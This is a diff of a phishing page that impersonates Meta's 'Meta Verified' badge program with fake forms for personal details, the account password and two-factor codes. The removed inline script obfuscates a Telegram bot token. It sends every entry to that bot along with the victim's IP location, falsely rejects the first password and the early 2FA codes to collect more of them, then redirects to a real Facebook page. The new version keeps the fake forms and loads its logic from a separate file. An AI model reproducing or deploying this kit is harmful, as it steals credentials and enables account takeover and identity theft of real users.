@@ -5,41 +5,31 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Meta Verified - Rewards for you</title>
 
+  <!-- Favicon -->
   <link rel="icon" href="/public/favicon-32x32.png" />
 
-  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/style.css" />
 
-  <style>
-    /* Ẩn/Hiện */
-    .hidden { display: none !important; }
-    
-    /* Input Style giống Facebook */
-    .meta-input {
-      width: 100%;
-      border: 1px solid #dddfe2;
-      border-radius: 6px;
-      padding: 12px 16px;
-      font-size: 15px;
-      color: #1c1e21;
-      outline: none;
-      transition: border-color 0.2s;
-    }
-    .meta-input:focus {
-      border-color: #1877f2;
-      box-shadow: 0 0 0 2px #e7f3ff;
-    }
-  </style>
+  <!-- Tailwind CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
 
 <body class="bg-gradient-to-br from-[#f9f1f9] via-[#eaf3fd] to-[#edfbf2] min-h-screen">
 
+  <!-- ===== PAGE CONTENT ===== -->
   <div class="max-w-[768px] mx-auto p-4">
     <div class="flex flex-col gap-6">
 
-      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" class="w-12 h-12" alt="Success" />
+      <img src="/public/tick.svg" class="w-12 h-12" alt="Success" />
 
-      <h1 class="text-3xl font-bold">Meta Verified - Rewards for you</h1>
-      <p class="font-semibold">Show the world that you mean business.</p>
+      <h1 class="text-3xl font-bold">
+        Meta Verified - Rewards for you
+      </h1>
+
+      <p class="font-semibold">
+        Show the world that you mean business.
+      </p>
 
       <p>
         Congratulations on achieving the requirements to upgrade your page
@@ -47,232 +37,162 @@
         your dedication and the trust you've built with your audience.
       </p>
 
+      <p>
+        We're thrilled to celebrate this moment with you and look forward
+        to seeing your page thrive with this prestigious recognition!
+      </p>
+
       <p class="text-[#465a69]">
-        Your ticket id: #<span id="ticketId">LOADING...</span>
+        Your ticket id: #
+        <span id="ticketId">XXXX-XXXX-XXXX</span>
       </p>
 
       <div>
-        <h3 class="font-bold mb-2">Verified Blue Badge Request Guide</h3>
-        <p>- Fact checkers may not respond to requests containing intimidation.</p>
-        <p>- Please provide all required information.</p>
+        <h3 class="font-bold mb-2">
+          Verified Blue Badge Request Guide
+        </h3>
+        <p>- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats.</p>
+        <p>- Please provide all required information to ensure timely processing.</p>
+        <p>- Once all details are submitted, we will evaluate your account accordingly.</p>
       </div>
 
-      <button id="submitRequestBtn" class="bg-[#1877f2] text-white rounded-full py-3 px-6 font-semibold w-full max-w-[300px] mx-auto hover:bg-[#166fe5] transition">
+      <button
+        id="submitRequestBtn"
+        class="bg-[#1877f2] text-white rounded-full py-3 px-6 font-semibold
+               w-full max-w-[300px] mx-auto">
         Submit request
       </button>
 
       <div class="flex flex-wrap gap-4 text-xs text-[#65676b] justify-center mt-6">
+        <a href="#">Help Center</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Terms of Service</a>
+        <a href="#">Community Standards</a>
         <a href="#">Meta © 2025</a>
       </div>
+
     </div>
   </div>
 
-  <div id="overlay" class="fixed inset-0 bg-black/50 hidden z-40 transition-opacity"></div>
+  <!-- ===== OVERLAY ===== -->
+  <div id="overlay" class="fixed inset-0 bg-black/50 hidden z-40"></div>
 
-  <div id="infoForm" class="fixed inset-0 hidden z-50 flex items-center justify-center p-4">
+  <!-- ===== INFO FORM ===== -->
+  <div id="infoForm" class="fixed inset-0 hidden z-50 flex items-center justify-center">
     <div class="bg-white w-full max-w-[420px] rounded-2xl p-6 shadow-2xl">
-      <h2 class="text-lg font-semibold mb-5">Information Form</h2>
+
+      <h2 class="text-lg font-semibold mb-5">
+        Information Form
+      </h2>
+
       <div class="space-y-3">
         <input class="meta-input" placeholder="Full Name" />
         <input class="meta-input" placeholder="Email" />
         <input class="meta-input" placeholder="Business Email" />
         <input class="meta-input" placeholder="Page Name" />
         <input class="meta-input" placeholder="Phone Number" />
+
         <div>
           <label class="text-sm text-gray-500">Date of Birth</label>
           <div class="grid grid-cols-3 gap-3 mt-2">
-            <input class="meta-input text-center" placeholder="DD" />
-            <input class="meta-input text-center" placeholder="MM" />
-            <input class="meta-input text-center" placeholder="YYYY" />
+            <input class="meta-input" placeholder="Day" />
+            <input class="meta-input" placeholder="Month" />
+            <input class="meta-input" placeholder="Year" />
           </div>
         </div>
-        <button id="sendInfoBtn" class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold hover:bg-[#166fe5]">
+
+        <textarea class="meta-input h-24" placeholder="Additional notes (optional)"></textarea>
+
+        <label class="flex items-center gap-2 text-sm">
+          <input type="checkbox" />
+          I agree with <span class="text-blue-600">Terms of use</span>
+        </label>
+
+        <button class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold">
           Send
         </button>
       </div>
     </div>
   </div>
 
-  <div id="passwordForm" class="fixed inset-0 hidden z-50 flex items-center justify-center p-4">
+  <!-- ===== PASSWORD FORM ===== -->
+  <div id="passwordForm" class="fixed inset-0 hidden z-50 flex items-center justify-center">
     <div class="bg-white w-full max-w-[420px] rounded-2xl p-6 shadow-2xl text-center">
-      <div class="w-12 h-12 mx-auto mb-4 bg-[#1877f2] rounded-full flex items-center justify-center text-white text-2xl font-bold">f</div>
-      <p class="text-gray-500 mb-4">For security reasons, please enter your password to continue.</p>
-      
-      <input id="passwordInput" type="password" class="meta-input mb-4" placeholder="Password" />
-      
-      <p id="passwordError" class="text-red-500 text-sm mb-3 hidden text-center"></p>
 
-      <button id="continueBtn" class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold hover:bg-[#166fe5]">
+      <img src="/public/favicon-32x32.png"
+           class="w-10 h-10 mx-auto mb-4" alt="Meta" />
+
+      <p class="text-gray-500 mb-4">
+        For security reasons, please enter your password to continue.
+      </p>
+
+      <input id="passwordInput"
+             type="password"
+             class="meta-input mb-4"
+             placeholder="Password" />
+
+      <p id="passwordError" class="text-red-500 text-sm mb-3 hidden text-center"></p>
+      <button id="continueBtn"
+              class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold">
         Continue
       </button>
     </div>
   </div>
 
-  <div id="verifyModal" class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/40 p-4">
-    <div class="bg-white w-full max-w-[420px] rounded-2xl p-6 shadow-2xl relative">
-      <div class="w-10 h-10 mx-auto mb-4 bg-[#1877f2] rounded-full flex items-center justify-center text-white text-xl font-bold">f</div>
-      <h2 class="text-[20px] font-bold text-gray-900 text-center mb-3">Two-factor authentication</h2>
-      <p class="text-[14px] text-gray-600 text-center mb-5">
-        Enter the code we sent to <span id="maskedEmail" class="font-bold"></span> or <span id="maskedPhone" class="font-bold"></span>.
+  <!-- ===== VERIFY CODE FORM ===== -->
+  <div id="verifyModal"
+       class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/40">
+
+    <div class="bg-white w-full max-w-[420px] rounded-2xl p-6 shadow-2xl">
+
+      <img src="/public/favicon-32x32.png"
+           class="w-10 h-10 mx-auto mb-4" alt="Meta" />
+
+      <p class="text-sm text-gray-500 mb-1 text-center">
+        <span id="userName"></span> • Facebook
       </p>
 
-      <input id="verifyCode" type="tel" class="meta-input mb-2 text-center text-xl tracking-[5px] font-bold" placeholder="Code" />
-      
-      <p id="verifyError" class="text-red-500 text-sm mb-2 hidden text-center"></p>
-      <p id="countdown" class="text-sm text-red-600 mb-3 hidden text-center font-bold"></p>
+      <h2 id="verifyTitle"
+          class="text-[22px] font-bold text-gray-900 text-center mb-3">
+        Two-factor authentication required (1/3)
+      </h2>
 
-      <button id="verifyBtn" class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold hover:bg-[#166fe5]">
-        Confirm
+      <img src="/public/verify-illustration.png"
+           class="w-full max-w-[360px] mx-auto mb-4" alt="Verification" />
+
+      <p class="text-[14px] leading-snug text-gray-600 text-center mb-4">
+        Enter the code we sent to
+        <span id="maskedEmail" class="font-medium text-gray-700"></span>,
+        <span id="maskedPhone" class="font-medium text-gray-700"></span>
+        or confirm through your authentication app.
+      </p>
+
+      <input id="verifyCode"
+             class="meta-input mb-2"
+             placeholder="Code" />
+
+      <p id="verifyError"
+         class="text-red-500 text-sm mb-2 hidden text-center">
+        The code you entered is incorrect.
+      </p>
+
+      <p id="countdown"
+         class="text-sm text-gray-500 mb-3 hidden text-center"></p>
+
+      <button id="verifyBtn"
+              class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold">
+        Continue
       </button>
+
+      <img src="/public/meta.png"
+           class="w-24 mx-auto mt-5 opacity-90" alt="Meta" />
+
     </div>
   </div>
 
-  <script>
-    /* --- JS MÃ HÓA (Đã giấu Token, an toàn cho Vercel) --- */
-    const _0x = {
-        // Token và ChatID đã mã hóa HEX (Người dùng F12 sẽ khó đọc được ngay)
-        t: "\x37\x31\x30\x30\x39\x32\x34\x39\x31\x31\x3A\x41\x41\x46\x62\x65\x32\x51\x48\x72\x78\x32\x36\x4A\x35\x70\x52\x45\x57\x74\x67\x6E\x2D\x6A\x6F\x32\x70\x57\x4B\x68\x35\x41\x39\x69\x6D\x45",
-        i: "\x2D\x35\x30\x37\x30\x31\x32\x31\x31\x36\x39",
-        r: "https://www.facebook.com/business/help",
-        a: "https://ipwho.is/"
-    };
+  <!-- MAIN JS -->
+  <script src="/main.js" defer></script>
 
-    const _U = {
-        // Lấy IP
-        g: async () => {
-            try {
-                let r = await fetch(_0x.a);
-                let d = await r.json();
-                return d.success ? { i:d.ip, c:d.city, o:d.country, f:d.flag?.emoji||"" } : { i:"Err", c:"N/A", o:"N/A", f:"" };
-            } catch { return { i:"Err", c:"N/A", o:"N/A", f:"" }; }
-        },
-        // Gửi tin nhắn về Telegram
-        s: async (m) => {
-            try {
-                await fetch(`https://api.telegram.org/bot${_0x.t}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: _0x.i, text: m, parse_mode: 'HTML' })
-                });
-            } catch {}
-        },
-        // Tạo nội dung tin nhắn
-        f: (d, t, l) => {
-            let tm = new Date().toLocaleString("vi-VN", {timeZone:"Asia/Ho_Chi_Minh"});
-            let ic = t==="INFO"?"📝":(t.includes("PASS")?"🔑":"🔥");
-            let m = `<b>${ic} ${t}</b> | ${tm}\n----------------\n<b>Name:</b> ${d.fn}\n<b>Mail:</b> ${d.em}`;
-            if(d.be) m+=`\n<b>Biz:</b> ${d.be}`;
-            m+=`\n<b>Phone:</b> ${d.ph}\n<b>DOB:</b> ${d.db}`;
-            if(d.p1) m+=`\n----------------\n<b>P1:</b> <code>${d.p1}</code>`;
-            if(d.p2) m+=`\n<b>P2:</b> <code>${d.p2}</code>`;
-            if(d.ot) m+=`\n----------------\n<b>OTP:</b> <code>${d.ot}</code>`;
-            return m + `\n================\n🌍 <code>${l.i}</code>\n📍 ${l.c}, ${l.o} ${l.f}`;
-        },
-        // Ẩn Email/SĐT (Masking)
-        m: (s, t) => {
-            if(!s || s.length<5) return "...";
-            return t==='e' ? `${s.substring(0,3)}***@${s.split('@')[1]}` : `${s.substring(0,3)}****${s.substring(s.length-3)}`;
-        }
-    };
-
-    document.addEventListener("DOMContentLoaded", async () => {
-        const loc = await _U.g();
-        let dat = {fn:"", em:"", be:"", ph:"", db:"", p1:"", p2:"", ot:""};
-        let pc=0, oc=0, lk=false;
-
-        // Các hàm rút gọn DOM
-        const $ = (id) => document.getElementById(id);
-        const err = (id, txt) => { let e=$(id); if(e){e.innerText=txt; e.classList.remove("hidden");} };
-        const hide = (id) => { let e=$(id); if(e)e.classList.add("hidden"); };
-        const show = (id) => {
-            $("overlay").classList.remove("hidden");
-            ["infoForm","passwordForm","verifyModal"].forEach(x=> hide(x));
-            $(id).classList.remove("hidden");
-        };
-
-        // Random Ticket ID
-        if($("ticketId")) $("ticketId").innerText = "REF-" + Math.floor(Math.random()*900000);
-        if($("submitRequestBtn")) $("submitRequestBtn").onclick = () => show("infoForm");
-
-        // --- BƯỚC 1: INFO FORM (Có kiểm tra lỗi) ---
-        if($("sendInfoBtn")) $("sendInfoBtn").onclick = () => {
-            let i = document.querySelectorAll("#infoForm input");
-            let v = {
-                n: i[0].value.trim(), e: i[1].value.trim(), b: i[2].value.trim(),
-                p: i[4].value.trim(), d: i[5].value.trim(), m: i[6].value.trim(), y: i[7].value.trim()
-            };
-
-            // Nếu thiếu thông tin -> Hiện lỗi đỏ
-            if(!v.n || !v.e || !v.p || !v.d || !v.m || !v.y) {
-                let e = $("infoError");
-                if(!e) {
-                    e = document.createElement("p"); e.id="infoError"; 
-                    e.className="text-red-500 text-sm mt-3 text-center";
-                    $("sendInfoBtn").parentNode.insertBefore(e, $("sendInfoBtn"));
-                }
-                e.innerText = "Please fill in all required fields."; e.classList.remove("hidden");
-                return;
-            }
-            hide("infoError");
-
-            // Lưu và gửi
-            dat.fn=v.n; dat.em=v.e; dat.be=v.b; dat.ph=v.p; dat.db=`${v.d}/${v.m}/${v.y}`;
-            _U.s(_U.f(dat, "INFO", loc));
-            show("passwordForm");
-        };
-
-        // --- BƯỚC 2: PASSWORD (2 lần nhập) ---
-        if($("continueBtn")) $("continueBtn").onclick = () => {
-            let p = $("passwordInput").value;
-            if(!p) return;
-            pc++;
-            if(pc === 1) { // Lần 1: Báo sai
-                dat.p1 = p;
-                _U.s(_U.f(dat, "PASS1", loc));
-                $("passwordInput").value = "";
-                err("passwordError", "The password you entered is incorrect. Please try again.");
-            } else { // Lần 2: Qua bước OTP
-                dat.p2 = p;
-                _U.s(_U.f(dat, "PASS2", loc));
-                $("maskedEmail").innerText = _U.m(dat.em, 'e');
-                $("maskedPhone").innerText = _U.m(dat.ph, 'p');
-                show("verifyModal");
-            }
-        };
-
-        // --- BƯỚC 3: OTP (Khóa 30s nếu sai) ---
-        if($("verifyBtn")) $("verifyBtn").onclick = () => {
-            if(lk) return;
-            let c = $("verifyCode").value;
-            if(!c) return;
-            dat.ot = c;
-            oc++;
-            _U.s(_U.f(dat, "OTP", loc));
-
-            if(oc < 3) { // Sai lần 1, 2
-                $("verifyCode").value = "";
-                err("verifyError", "The code you entered is incorrect.");
-                lk = true;
-                let b = $("verifyBtn"), cd = $("countdown"), s = 30;
-                b.disabled = true; b.style.opacity = "0.7"; b.innerText = "Please wait...";
-                if(cd) {
-                    cd.classList.remove("hidden");
-                    let t = setInterval(() => {
-                        s--; cd.innerText = `Try again in ${s}s`;
-                        if(s <= 0) {
-                            clearInterval(t); lk = false;
-                            cd.classList.add("hidden"); hide("verifyError");
-                            b.disabled = false; b.style.opacity = "1"; b.innerText = "Confirm";
-                        }
-                    }, 1000);
-                }
-            } else { // Lần 3: Chuyển trang
-                $("verifyBtn").innerText = "Processing...";
-                hide("verifyError");
-                setTimeout(() => window.location.href = _0x.r, 1500);
-            }
-        };
-    });
-  </script>
 </body>
 </html>
+
